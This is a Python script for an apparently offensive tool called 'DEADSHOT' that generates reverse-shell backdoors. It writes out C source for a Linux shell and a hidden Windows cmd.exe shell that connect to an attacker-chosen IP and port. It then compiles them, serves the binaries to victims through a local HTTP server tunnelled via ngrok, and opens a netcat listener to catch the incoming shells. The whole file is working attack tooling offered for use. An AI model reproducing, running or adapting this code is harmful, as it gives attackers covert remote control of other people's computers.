from subprocess import check_output
from time import sleep
import os
import sys
import http.server
import socket
import re


def main():
    print("""
                                 \033[1;36m
|       ....                                    ..          .x+=:.                                s    
   .xH888888Hx.                              dF           z`    ^%    .uef^"                    :8    
 .H8888888888888:                           '88bu.           .   <k :d88E              u.      .88    
 888*"""?""*88888X        .u          u     '*88888bu      .@8Ned8" `888E        ...ue888b    :888ooo 
'f     d8x.   ^%88k    ud8888.     us888u.    ^"*8888N   .@^%8888"   888E .z8k   888R Y888r -*8888888 
'>    <88888X   '?8  :888'8888. .@88 "8888"  beWE "888L x88:  `)8b.  888E~?888L  888R I888>   8888    
 `:..:`888888>    8> d888 '88%" 9888  9888   888E  888E 8888N=*8888  888E  888E  888R I888>   8888    
        `"*88     X  8888.+"    9888  9888   888E  888E  %8"    R88  888E  888E  888R I888>   8888    
   .xHHhx.."      !  8888L      9888  9888   888E  888F   @8Wou 9%   888E  888E u8888cJ888   .8888Lu= 
  X88888888hx. ..!   '8888c. .+ 9888  9888  .888N..888  .888888P`    888E  888E  "*888*P"    ^%888*   
 !   "*888888888"     "88888%   "888*""888"  `"888*""   `   ^"F     m888N= 888>    'Y"         'Y"    
        ^"***"`         "YP'     ^Y"   ^Y'      ""                   `Y"   888                        
                                                                          J88"                        
                                                                          @%                          
                                                                        :"                            



""")


def banner():
    print("""
  \033[1;36m  [\033[1;39m1\033[1;36m] Linux  
    [\033[1;39m2\033[1;36m] Windows 
    [\033[1;39m3\033[1;36m] Listening_Connection 
    [\033[1;39m4\033[1;36m] Exit     
""")

    options = input("\033[1;39mSelect Option : \033[1;39m")

    # linux
    if (options == '1'):

        host = input("\n\033[1;36mIP: \033[1;39m")
        port = input("\n\033[1;36mPORT: \033[1;39m")
        linux_shell(host, port)
        os.system("gcc .linux.c -o DEADSHOT-BackdoorLinux -pthread && rm -rf .linux.c")
        os.system("chmod +x DEADSHOT-BackdoorLinux")
        print("\n\033[1;36mFile Saved > \033[1;39mDEADSHOT-BackdoorLinux")
        # http.server 80
        os.system("python3 -m http.server 80 > .server 2> /dev/null &")
        os.system("chmod +x ngrok")
        name1 = "/DEADSHOT-BackdoorLinux"
        portN = 80
        os.system("./ngrok http {} > /dev/null &".format(portN))
        sleep(8)
        os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url')
        urlFile = open('link2.url', 'r')
        url = urlFile.read()
        urlFile.close()
        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
            print("\n\033[1;36mLINK : \033[1;39m", url + name1)

        print(" ")

    # windows
    if (options == '2'):

        host = input("\n\033[1;36mIP: \033[1;39m")
        port = input("\n\033[1;36mPORT: \033[1;39m")
        windows_reverse(host, port)
        os.system(
            "/usr/bin/i686-w64-mingw32-gcc .windows.c -o DEADSHOT-BackdoorWindows.exe -lws2_32 && rm -rf .windows.c")
        print("\n\033[1;36mFile Saved > \033[1;3939mDEADSHOT-BackdoorWindows")

        # http.server 80
        os.system("python3 -m http.server 80 > .server 2> /dev/null &")
        os.system("chmod +x ngrok")
        name2 = "/DEADSHOT-BackdoorWindows.exe"
        portN = 80
        os.system("./ngrok http {} > /dev/null &".format(portN))
        sleep(8)
        os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url')
        urlFile = open('link2.url', 'r')
        url = urlFile.read()
        urlFile.close()
        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
            print("\n\033[1;36mLINK : \033[1;39m", url + name2)

        print(" ")

    if (options == '3'):
        port = input("\n\033[1;36mPORT: \033[1;39m")
        print("\n\033[1;36mWait Connection ...\n")
        os.system("nc -l %s" % port)
        print("\033[1;36m")

    if (options == '4'):
        sys.exit()
        os.system("fuser -k -n tcp 80")  # kill port 80


    else:
        banner()


def linux_shell(host, port):
    with open(".linux.c", "w") as file:
        file.write('''
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main (int argc, char **argv)
{
  int scktd;
  struct sockaddr_in client;

  client.sin_family = AF_INET;
  client.sin_addr.s_addr = inet_addr("%s");
  client.sin_port = htons(%s);
  scktd = socket(AF_INET,SOCK_STREAM,0);
  connect(scktd,(struct sockaddr *)&client,sizeof(client));
  dup2(scktd,0); // STDIN
  dup2(scktd,1); // STDOUT
  dup2(scktd,2); // STDERR
  execl("/bin/sh","sh","-i",NULL,NULL);
  return 0;
}
''' % (host, port))


def windows_reverse(host, port):
    with open(".windows.c", "w") as file:
        file.write('''
#include <winsock2.h>
#include <stdio.h>
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib,"ws2_32")
  WSADATA wsaData;
  SOCKET Winsock;
  SOCKET Sock;
  struct sockaddr_in hax;
  char ip_addr[16];
  STARTUPINFO ini_processo;
  PROCESS_INFORMATION processo_info;
//int main(int argc, char *argv[])
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam, int iCmdShow)
{
    FreeConsole();
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    struct hostent *host;
    host = gethostbyname("''' + host + '''");
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi("''' + port + '''"));
    hax.sin_addr.s_addr = inet_addr(ip_addr);
    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);
    memset(&ini_processo,0,sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&ini_processo,&processo_info);
}
''')


if __name__ == '__main__':
    main()

banner()
